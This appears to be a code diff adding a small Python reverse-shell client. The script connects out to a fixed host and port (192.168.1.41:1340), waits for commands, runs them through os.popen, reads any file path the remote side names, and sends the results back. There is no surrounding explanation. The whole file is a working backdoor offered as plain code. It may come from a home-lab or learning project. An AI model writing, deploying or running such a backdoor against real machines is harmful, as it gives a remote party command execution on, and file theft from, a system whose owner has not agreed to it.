@@ -1,0 +1,36 @@
+import socket
+import os
+import subprocess
+
+cs = socket.socket()
+try:
+    cs.connect(("192.168.1.41", 1340))
+    print("client connected")
+    command = None
+    while True:
+        command = cs.recv(2048).decode()
+        if command == "exit":
+            print("Exiting Program")
+            cs.close()
+            break
+        elif "search" in command:
+            print("Search mode engaged")
+            command = cs.recv(2048).decode()
+            print(f"SearchCommand: {command}")
+            output = os.popen(command).read()
+        elif "get" in command:
+            path_src = cs.recv(2048).decode()
+            print(f"Trying to reach path: {path_src}")
+            output = open(path_src,"r").read()
+        else:
+            print("NOrmal command")
+            output = os.popen(command).read()
+        if output == None or output == "":
+            print("Bad Command")
+            output = "wrong command"
+        cs.send(output.encode())
+except:
+    print("Operation failed closing socket")
+    cs.close()
+    raise 
+
